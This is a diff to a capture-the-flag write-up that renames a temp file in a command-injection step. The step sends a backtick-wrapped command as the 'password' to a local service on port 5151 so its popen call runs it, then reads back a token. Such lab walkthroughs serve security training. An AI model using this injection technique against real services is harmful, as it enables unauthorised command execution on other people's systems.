@@ -75,13 +75,13 @@ Maybe we need to inject code for the popen, let's try
 
 ```
 $ nc localhost 5151
-> password : `getflag` > /tmp/flag
+> password : `getflag` > /tmp/flag11
 ```
 
 Verifying the file
 
 ```
-$ cat /tmp/flag
+$ cat /tmp/flag11
 > Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
 ```
 
